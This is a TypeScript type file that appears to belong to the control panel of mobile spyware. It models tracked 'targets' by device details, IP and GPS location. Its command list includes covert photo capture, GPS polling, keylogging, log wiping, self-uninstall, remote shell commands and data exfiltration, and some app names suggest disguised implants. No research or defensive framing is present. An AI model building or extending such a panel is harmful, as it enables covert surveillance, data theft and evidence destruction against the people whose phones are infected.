'use client';

export type TargetStatus = 'ONLINE' | 'OFFLINE' | 'UNKNOWN' | string;
export type AppType = 'FLYING_BIRD' | 'SHOPEE_ALIBI' | 'ALL';

export interface Target {
  id: string;
  appType?: AppType;
  deviceInfo?: {
    model?: string;
    manufacturer?: string;
    os?: string;
    serial?: string;
    ip?: string;
    [key: string]: any;
  };
  location?: {
    lat?: number;
    lng?: number;
    time?: number;
    address?: string;
  };
  status?: TargetStatus;
  battery?: number;
  lastSeen?: number;
  last_ping?: number;
  ip?: string;
  model?: string;
  [key: string]: any;
}

export type CommandAction =
  | 'capture_photo'
  | 'take_photo'
  | 'get_gps'
  | 'wipe_logs'
  | 'toggle_keylog'
  | 'self_uninstall'
  | 'shell_command'
  | 'data_exfil';

export interface Command {
  deviceId: string;
  action: CommandAction;
  timestamp?: number;
  status?: 'pending' | 'executing' | 'completed' | 'failed';
  payload?: Record<string, any>;
}
